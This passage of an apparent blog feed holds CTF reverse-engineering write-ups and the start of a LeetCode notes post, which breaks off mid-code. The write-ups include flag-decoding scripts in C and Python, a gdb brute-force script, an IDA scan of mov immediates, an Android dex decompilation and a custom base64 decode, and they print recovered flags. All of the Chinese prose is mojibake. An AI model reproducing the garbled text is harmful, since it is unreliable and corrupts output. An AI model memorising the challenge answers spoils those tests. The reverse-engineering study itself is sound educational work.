class="string">"95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">generate(i, result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(result[<span class="number">84</span>] == <span class="number">0x95</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a); i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">48</span> &amp;&amp; a[i] &lt;= <span class="number">57</span>)</span><br><span class="line">a[i] -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">48</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;= <span class="number">57</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"></span><br><span class="line">value = a[i+<span class="number">1</span>] | a[i]*<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(result[j] == value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200528122051072-1591167097050.png" alt="image-20200528122051072"></p><p>åšå®Œå»çœ‹äº†çœ‹ç½‘ä¸Šçš„ writeupï¼Œ å‘ç°éƒ½æ˜¯ç”¨gdbå†™è„šæœ¬æçš„ï¼Œç„¶åå»å­¦ä¹ äº†ä¸‹ã€‚</p><p>ä½¿ç”¨ gdbçš„ define å‘½ä»¤å¯ä»¥å®šä¹‰ä¸€ç³»åˆ—çš„gdbæŒ‡ä»¤ã€‚é¦–å…ˆæ‰¾åˆ°è¦ä¸‹æ–­ç‚¹åœ°å€ï¼Œè¿™ä¸ªåœ¨idaä¸­å¾ˆå®¹æ˜“ã€‚</p><p>è¿™é‡Œæœ‰2ä¸­æ–¹æ³•ï¼Œæ‰§è¡Œgdbè„šæœ¬ï¼Œä¸€ï¼šç›´æ¥è¾“å…¥defienå‘½ä»¤ï¼Œè¾“å…¥æŒ‡ä»¤ï¼Œæœ€åæ‰§è¡Œã€‚äºŒï¼šå•ç‹¬å†™æˆä¸€ä¸ªè„šæœ¬æ–‡ä»¶ä½¿ç”¨ source æ¥æ‰§è¡Œã€‚</p><p>è¿™é‡Œç›´æ¥å†™çš„è„šæœ¬æ–‡ä»¶ä½¿ç”¨ sourceæ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">set $i = <span class="number">0</span></span><br><span class="line">set $total = <span class="number">256</span></span><br><span class="line"><span class="keyword">while</span>($i &lt; $total)</span><br><span class="line">  b *<span class="number">0x80485b4</span></span><br><span class="line">  b *<span class="number">0x8048707</span></span><br><span class="line">  run T</span><br><span class="line">  set $i = $i+<span class="number">1</span></span><br><span class="line">  set *(char*)($ebp<span class="number">-0xc</span>) = $i</span><br><span class="line">  <span class="keyword">continue</span></span><br><span class="line">  <span class="keyword">if</span> ($eax == <span class="number">0x95</span>)</span><br><span class="line">    <span class="keyword">print</span> $i</span><br><span class="line">    x/<span class="number">127</span>xb $esp+<span class="number">0x1c</span></span><br><span class="line">    set $i = <span class="number">256</span></span><br><span class="line">  stop</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200528163112618-1591167101638.png" alt="image-20200528163112618"></p><p>å› ä¸ºå¯æ‰“å°å­—ç¬¦çš„ASCIIï¼š32-127ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“å°å‡ºå‰128ä¸ªæ•°æ®å³å¯ã€‚æœ€åè§£å¯†ã€‚pythonç¡®å®æ–¹ä¾¿ï¼Œå„ç§æ–¹æ³•ç›´æ¥è°ƒç”¨å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">list =  [<span class="number">0xd6</span>,<span class="number">0xc9</span>,<span class="number">0xc2</span>,<span class="number">0xce</span>,<span class="number">0x47</span>,<span class="number">0xde</span>,<span class="number">0xda</span>,<span class="number">0x70</span></span><br><span class="line">,<span class="number">0x85</span>,<span class="number">0xb4</span>,<span class="number">0xd2</span>,<span class="number">0x9e</span>,<span class="number">0x4b</span>,<span class="number">0x62</span>,<span class="number">0x1e</span>,<span class="number">0xc3</span></span><br><span class="line">,<span class="number">0x7f</span>,<span class="number">0x37</span>,<span class="number">0x7c</span>,<span class="number">0xc8</span>,<span class="number">0x4f</span>,<span class="number">0xec</span>,<span class="number">0xf2</span>,<span class="number">0x45</span></span><br><span class="line">,<span class="number">0x18</span>,<span class="number">0x61</span>,<span class="number">0x17</span>,<span class="number">0x1a</span>,<span class="number">0x29</span>,<span class="number">0x11</span>,<span class="number">0xc7</span>,<span class="number">0x75</span></span><br><span class="line">,<span class="number">0x02</span>,<span class="number">0x48</span>,<span class="number">0x26</span>,<span class="number">0x93</span>,<span class="number">0x83</span>,<span class="number">0x8a</span>,<span class="number">0x42</span>,<span class="number">0x79</span></span><br><span class="line">,<span class="number">0x81</span>,<span class="number">0x10</span>,<span class="number">0x50</span>,<span class="number">0x44</span>,<span class="number">0xc4</span>,<span class="number">0x6d</span>,<span class="number">0x84</span>,<span class="number">0xa0</span></span><br><span class="line">,<span class="number">0xb1</span>,<span class="number">0x72</span>,<span class="number">0x96</span>,<span class="number">0x76</span>,<span class="number">0xad</span>,<span class="number">0x23</span>,<span class="number">0xb0</span>,<span class="number">0x2f</span></span><br><span class="line">,<span class="number">0xb2</span>,<span class="number">0xa7</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0x5e</span>,<span class="number">0x92</span>,<span class="number">0x07</span>,<span class="number">0xc0</span></span><br><span class="line">,<span class="number">0xbc</span>,<span class="number">0x36</span>,<span class="number">0x99</span>,<span class="number">0xaf</span>,<span class="number">0xae</span>,<span class="number">0xdb</span>,<span class="number">0xef</span>,<span class="number">0x15</span></span><br><span class="line">,<span class="number">0xe7</span>,<span class="number">0x8e</span>,<span class="number">0x63</span>,<span class="number">0x06</span>,<span class="number">0x9c</span>,<span class="number">0x56</span>,<span class="number">0x9a</span>,<span class="number">0x31</span></span><br><span class="line">,<span class="number">0xe6</span>,<span class="number">0x64</span>,<span class="number">0xb5</span>,<span class="number">0x58</span>,<span class="number">0x95</span>,<span class="number">0x49</span>,<span class="number">0x04</span>,<span class="number">0xee</span></span><br><span class="line">,<span class="number">0xdf</span>,<span class="number">0x7e</span>,<span class="number">0x0b</span>,<span class="number">0x8c</span>,<span class="number">0xff</span>,<span class="number">0xf9</span>,<span class="number">0xed</span>,<span class="number">0x7a</span></span><br><span class="line">,<span class="number">0x65</span>,<span class="number">0x5a</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0x86</span>,<span class="number">0x30</span></span><br><span class="line">,<span class="number">0xf0</span>,<span class="number">0x4c</span>,<span class="number">0xb7</span>,<span class="number">0xca</span>,<span class="number">0xe5</span>,<span class="number">0x89</span>,<span class="number">0x2a</span>,<span class="number">0x1d</span></span><br><span class="line">,<span class="number">0xe4</span>,<span class="number">0x16</span>,<span class="number">0xf5</span>,<span class="number">0x3a</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x8d</span>,<span class="number">0x40</span></span><br><span class="line">,<span class="number">0x09</span>,<span class="number">0x03</span>,<span class="number">0x6f</span>,<span class="number">0x94</span>,<span class="number">0xa5</span>,<span class="number">0x4a</span>,<span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">s = <span class="string">"95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a"</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>):</span><br><span class="line">    s1 = int(s[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    flag += chr(list.index(s1))</span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šè¿™é“é¢˜æ”¶è·è¿˜æ˜¯å¾ˆå¤§ã€‚1ï¼šå¯¹idaä¸­æ±‡ç¼–è¯­è¨€çš„è§£è¯»æ›´ç†Ÿæ‚‰äº†äº›ï¼Œæ³¨æ„å„ç§ al å–æœ€ä½å­—èŠ‚æ•°æ®ã€‚ 2ï¼šroræŒ‡ä»¤çš„äº†è§£ï¼ŒåŠå¯¹ä»–çš„Cè¯­è¨€ç”¨æ³•ï¼šå¦‚ <code>ror aï¼Œ3</code> é‚£Cè¯­è¨€ä¸ºï¼š<code>((a&gt;&gt;3ï¼‰| ((a&amp;7) &lt;&lt; 5))</code>ã€‚ 3ï¼šä½¿ç”¨gdbå†™è„šæœ¬ã€‚</strong></p><blockquote><p><strong>gdbè„šæœ¬ä¸­çš„ æŸ¥çœ‹å†…å­˜å†…å®¹çš„æ–¹æ³•ï¼šx/&lt;n/f/u&gt; <addr>     nã€fã€uæ˜¯å¯é€‰çš„å‚æ•°ã€‚</addr></strong></p><p><strong>nï¼šæ˜¾ç¤ºçš„å†…å­˜å•å…ƒçš„ä¸ªæ•°ï¼Œfï¼šè¡¨ç¤ºæ˜¾ç¤ºçš„æ ¼å¼ï¼Œå…¶ä¸­ï¼šsï¼šå­—ç¬¦ä¸²æ˜¾ç¤ºï¼Œxï¼šæŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œdï¼šæŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡</strong></p><p><strong>uï¼šæŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ï¼Œtï¼šæŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œ oï¼šæŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œcï¼šæŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</strong></p><p><strong>æœ€åçš„uè¡¨ç¤ºæ¯ä¸ªå•å…ƒçš„å¤§å°ï¼Œå…¶ä¸­ï¼šbè¡¨ç¤ºå•å­—èŠ‚ï¼Œhè¡¨ç¤ºåŒå­—èŠ‚ï¼Œwè¡¨ç¤ºå››å­— èŠ‚ï¼Œgè¡¨ç¤ºå…«å­—èŠ‚ã€‚</strong></p><p><strong>é‚£ä¸Šé¢è„šæœ¬å†™çš„ x/127xb  è¡¨ç¤ºå°† 127ä¸ªçš„å•å­—èŠ‚å•å…ƒçš„æ•°æ®æŒ‰16è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå‡ºæ¥ã€‚</strong></p></blockquote><h3 id="What-does-this-button-do"><a href="#What-does-this-button-do" class="headerlink" title="What-does-this-button-do"></a>What-does-this-button-do</h3><blockquote><p>å¾ˆç®€å•çš„ä¸€é“å®‰å“é€†å‘ï¼Œä¸ºä»€ä¹ˆåˆ†æ•°é‚£ä¹ˆé«˜ã€‚ã€‚ã€‚</p></blockquote><p>ä¸‹è½½è§£å‹åå¾—åˆ°ä¸€å †æ–‡ä»¶ï¼Œå¯¹å®‰å“é€†å‘æ²¡æ·±å…¥äº†è§£è¿‡ï¼Œç›´æ¥æ‰¾åˆ° .dexæ–‡ä»¶ï¼Œä½¿ç”¨å¼ºå¤§çš„ ApkToolkit å·¥å…·è½¬ .dexæ–‡ä»¶ä¸º .jaræ–‡ä»¶ã€‚</p><p>æ¥ç€å°±æ˜¯ä½¿ç”¨ jd-gui æ‰“å¼€ï¼Œçœ‹åç¼–è¯‘çš„javaä»£ç ã€‚</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200530123951599-1591167111011.png" alt="image-20200530123951599"></p><p>çœ‹ FlagActivity.classï¼Œå°±æ˜¯ç›´æ¥å–å‡ºflagã€‚</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200530124201413-1591167113886.png" alt="image-20200530124201413"></p><p>æ‰“å°å‡ºæ¥å°±å¥½äº†ã€‚flag: <strong>flag{w4nn4_j4r_my_d3x}</strong></p><p><strong>æ€»ç»“ï¼šå®‰å“é€†å‘ä¹Ÿæ˜¯é‡åˆ°ä¸€é“ï¼Œç„¶ååšæ¥è¯•è¯•çœ‹ï¼Œä½†ä¹Ÿåªèƒ½åšå¾ˆç®€å•çš„ï¼Œæš‚æ—¶ç†Ÿæ‚‰å·¥å…·å§ã€‚</strong></p><h3 id="re5-packed-movement"><a href="#re5-packed-movement" class="headerlink" title="re5-packed-movement"></a>re5-packed-movement</h3><blockquote><p>å¯¹äºå…¨æ˜¯movæŒ‡ä»¤ï¼Œè¿™é“é¢˜çœ‹äº†writeupåšçš„ï¼Œå­¦ä¹ äº†idaä¸­è„šæœ¬çš„ä½¿ç”¨ã€‚</p></blockquote><p>32ä½elfæ–‡ä»¶åŠ äº†upxå£³ï¼Œç›´æ¥ä½¿ç”¨ upx -dã€‚</p><p>æ‰“å¼€å…¨æ˜¯movæŒ‡ä»¤ï¼Œå¿ƒæƒ³è¿™åˆæ˜¯ä»€ä¹ˆéªšæ“ä½œï¼Œä¸€æ³¢æ“ä½œåè¿˜æ˜¯ä¸ä¼šã€‚åé¢å‘ç°éƒ½æ˜¯ç”¨idaè„šæœ¬å®ç°ï¼Œé‚£å…¶å®ä¹Ÿå¯ä»¥ç”¨gdbè„šæœ¬ã€‚</p><p>å­¦ä¹ ä¸€ç•ªidaè„šæœ¬åŠidcçš„è¯­æ³•ï¼Œå¼€å§‹åšé¢˜ã€‚å…ˆæ‰¾åˆ°ä»£ç æ®µåœ°å€ï¼Œå› ä¸ºè€ƒè™‘flagæ˜¯é€šè¿‡ç«‹å³æ•°movæŒ‡ä»¤èµ‹å€¼çš„ã€‚</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200602151634347.png" alt="image-20200602151634347"></p><p>å†™è„šæœ¬æœç´¢å››ä¸ªå­—èŠ‚çš„æ‰€æœ‰å¯æ‰“å°å­—ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">start=<span class="number">0x0804829C</span></span><br><span class="line">end=<span class="number">0x08060B3A</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> start&lt;end:</span><br><span class="line">    <span class="keyword">if</span> (Byte(start) &lt;= ord(<span class="string">'9'</span>) <span class="keyword">and</span> Byte(start)&gt;=ord(<span class="string">'0'</span>)) <span class="keyword">or</span> (Byte(start)&lt;=ord(<span class="string">'z'</span>) <span class="keyword">and</span>                 Byte(start)&gt;=ord(<span class="string">'a'</span>)) <span class="keyword">or</span> (Byte(start)&lt;=ord(<span class="string">'Z'</span>) <span class="keyword">and</span> Byte(start)&gt;=ord(<span class="string">'A'</span>)) <span class="keyword">or</span> </span><br><span class="line">      (Byte(start) == ord(<span class="string">'&#125;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'&#123;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'_'</span>)) <span class="keyword">or</span> </span><br><span class="line">      (Byte(start) == ord(<span class="string">'@'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'!'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'#'</span>)) <span class="keyword">or</span>     (Byte(start) == ord(<span class="string">'&amp;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'*'</span>)):</span><br><span class="line">        <span class="keyword">if</span> Byte(start) <span class="keyword">and</span> (Byte(start+<span class="number">1</span>)==<span class="number">0</span>) <span class="keyword">and</span> (Byte(start+<span class="number">2</span>)==<span class="number">0</span>) <span class="keyword">and</span> (Byte(start+<span class="number">3</span>)==<span class="number">0</span>):</span><br><span class="line">            print(chr(Byte(start)))</span><br><span class="line">            flag += chr(Byte(start))</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œã€‚</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200602154318790.png" alt="image-20200602154318790"></p><p><strong>æ€»ç»“ï¼šå¯¹idaè„šæœ¬è¿›è¡Œäº†å­¦ä¹ ï¼Œå¼€å§‹å¯¹idaæ‰§è¡Œè„šæœ¬æœ‰æ‰€äº†è§£ã€‚</strong></p><h3 id="æ¢…æ´¥ç¾æ²»éƒ"><a href="#æ¢…æ´¥ç¾æ²»éƒ" class="headerlink" title="æ¢…æ´¥ç¾æ²»éƒ"></a>æ¢…æ´¥ç¾æ²»éƒ</h3><p>å¾ˆç®€å•ä¸€ä¸ªé¢˜ç›®ï¼Œå…³é”®å°±æ˜¯ä¸€ç‚¹ï¼Œä½¿ç”¨äº†å‡½æ•°AddVectoredExceptionHandlerï¼ˆï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ULONG                       First,</span></span></span><br><span class="line"><span class="function"><span class="params">  PVECTORED_EXCEPTION_HANDLER Handler <span class="comment">//è¦æ³¨å†Œçš„å¼‚å¸¸å¤„ç†ç¨‹åºã€‚</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£å¯çŸ¥ï¼Œæ­¤å‡½æ•°ä½œç”¨ï¼š<strong>æ³¨å†Œä¸€ä¸ªå¼‚å¸¸å¤„ç†ç¨‹åº</strong>ã€‚å³å½“æˆ‘ä»¬çš„ç¨‹åºä¸­å‡ºç°å¼‚å¸¸åä¼šæ‰§è¡Œçš„å‡½æ•°ã€‚</p><p>ç¨‹åºåœ¨æ­¤å¤„è§¦å‘å¼‚å¸¸ï¼š<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200919201636653.png" alt="image-20200919201636653"></p><h3 id="easy-go"><a href="#easy-go" class="headerlink" title="easy_go"></a>easy_go</h3><p>goè¯­è¨€å†™çš„ç¨‹åºï¼Œè°·æ­Œäº†ä¸‹å»é™¤ç¬¦å·è¡¨golangç¼–è¯‘çš„ç¨‹åºçš„å¤„ç†æ–¹æ³•ã€‚</p><p>å¯ä»¥ä½¿ç”¨ä¸€ä¸ªè„šæœ¬<a href="https://github.com/sibears/IDAGolangHelper.git" target="_blank" rel="noopener">IDAGolangHelper</a>æ¥è¿˜åŸç¬¦å·è¡¨ï¼Œé‚£å°†æå¤§æ–¹ä¾¿æˆ‘ä»¬åˆ†æç¨‹åºã€‚</p><p>ä½†æ˜¯ida7.0å› ä¸ºç‰ˆæœ¬ä½çš„åŸå› ï¼Œä½¿ç”¨è¿™ä¸ªè„šæœ¬ä¼šæœ‰é—®é¢˜ã€‚ç„¶åæ‰¾åˆ°è§£å†³åŠæ³•ï¼š<a href="https://blog.csdn.net/qq_21063873/article/details/104335240" target="_blank" rel="noopener">https://blog.csdn.net/qq_21063873/article/details/104335240</a></p><p>æˆåŠŸè¿˜åŸç¬¦å·è¡¨åï¼Œæ‰¾åˆ°main_mainå‡½æ•°ï¼Œä¸»é€»è¾‘è¿˜æ˜¯èƒ½æ¸…æ¥šï¼Œä½†ç»†èŠ‚çš„åœ°æ–¹çœŸçš„éš¾çœ‹ã€‚ã€‚</p><p>å‘ç°base64ç›¸å…³çš„å‡½æ•°ï¼š<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200924200352664.png" alt="image-20200924200352664"></p><p>ç„¶ååŠ¨è°ƒæƒ³çœ‹çœ‹è‡ªå·±è¾“å…¥çš„å­—ç¬¦ä¸²å­˜æ”¾åœ¨å“ªé‡Œä¹Ÿæ‰¾ä¸åˆ°ã€‚ã€‚ã€‚ä½†æ˜¯åŠ¨è°ƒå‡ºäº†2ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶ä¸­ä¸€ä¸ªæ­£å¥½æ˜¯64ä½ï¼Œè€ƒè™‘æ˜¯å˜å¼‚çš„base64åŠ å¯†ï¼Œå¦ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯è¾“å…¥flagçš„å¯†æ–‡ã€‚</p><p>å†™è„šæœ¬å°è¯•è§£ï¼šè¿˜çœŸçš„å¾—åˆ°flagã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">base1 = <span class="string">'6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345'</span></span><br><span class="line">t = <span class="string">'tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3'</span></span><br><span class="line">base = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">ans += base[base1.index(i)]</span><br><span class="line">print(ans)</span><br><span class="line">print(base64.b64decode(ans))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leetcode</title>
      <link href="/2020/03/14/leetcode/"/>
      <url>/2020/03/14/leetcode/</url>
      
        <content type="html"><![CDATA[<p>åšäº†ä¸€ç‚¹çš„leetcodeã€‚<a id="more"></a></p><h2 id="æ‘©å°”æŠ•ç¥¨"><a href="#æ‘©å°”æŠ•ç¥¨" class="headerlink" title="æ‘©å°”æŠ•ç¥¨"></a>æ‘©å°”æŠ•ç¥¨</h2><p>ä¸ªäººæ€»ç»“ï¼š</p><p>åœ¨ä¸€ç¾¤ä»¥å°é˜Ÿä¸ºç»„çš„æˆ˜äº‰ä¸­ï¼Œ 2ä¸ªé‡åˆ°è‹¥ä¸æ˜¯åŒé˜Ÿçš„å°±åŒæ–¹é˜µäº¡ï¼Œè‹¥2ä¸ªäººæ˜¯åŒé˜Ÿçš„å°±ç»“åˆèµ·æ¥ã€‚è¿™æ ·ä¸€ç›´ä¸‹å»ï¼Œæœ€åç•™ä¸‹æ¥çš„äººï¼Œå°†æ˜¯è¿™åœºæˆ˜äº‰ä¸­æœ€å¤šçš„äººçš„å°é˜Ÿçš„ã€‚è¯¥ç®—æ³•å¯ä»¥è§£å†³ è®¡ç®—ä¸€ä¸ªæ•°ç»„ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„å…ƒç´ ã€‚( ä»ç¬¬ä¸€ä¸ªæ•°å¼€å§‹count=1ï¼Œé‡åˆ°ç›¸åŒçš„å°±åŠ 1ï¼Œé‡åˆ°ä¸åŒçš„å°±å‡1ï¼Œå‡åˆ°0å°±é‡æ–°æ¢ä¸ªæ•°å¼€å§‹è®¡æ•°ï¼Œæ€»èƒ½æ‰¾åˆ°æœ€å¤šçš„é‚£ä¸ª )</p><p><img src="/2020/03/14/leetcode/image-20200314141207184-1590548390775.png" alt="image-20200314141207184"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">  &#123;</span><br><span class="line">     <span class="keyword">if</span>(nums[ans] == nums[i])</span><br><span class="line">       count++;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       count--;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line">       ans = i+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>(count &gt; numsSize/<span class="number">2</span>)</span><br><span class="line">       <span class="keyword">break</span>; </span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> nums[ans];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h2><p>å°†ä¸€ä¸ªé—®é¢˜ï¼Œåˆ†æˆè‹¥å¹²ä¸ªçš„å­é—®é¢˜è§£å†³ </p><pre><code>dp[i]è¡¨ç¤ºnums[0]åˆ°nums[i]ï¼Œå«nums[i]çš„æœ€é•¿ä¸Šå‡å­åºåˆ—ï¼›å¦‚æœnums[j] &lt; nums[i],å°±dp[i]=max(dp[i],dp[j]+1)æ¯æ¬¡ä¿å­˜æœ€å¤§é•¿åº¦res=max(res,dp[i]) ////å› ä¸ºæœ€åä¸€ä¸ªå…ƒç´ nums[n]ï¼Œä¸ä¸€å®šåœ¨æœ€é•¿å­åºåˆ—ä¸­å¦‚[10,9,2,5,3,7,101,6][10,9,2,5,3,7,101,6],dp[0]=1[10,9,2,5,3,7,101,6],dp[1]=1[10,9,2,5,3,7,101,6],dp[2]=1[10,9,2,5,3,7,101,6],dp[3]=dp[2]+1 //res=2[10,9,2,5,3,7,101,6],dp[4]=dp[2]+1 //res=2[10,9,2,5,3,7,101,6],dp[5]=dp[3]+1 //res=3[10,9,2,5,3,7,101,6],dp[6]=dp[5]+1 //res=4[10,9,2,5,3,7,101,6],dp[7]=dp[4]+1 //res=4</code></pre><p><img src="/2020/03/14/leetcode/image-20200314142330565-1590548403309.png" alt="image-20200314142330565"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 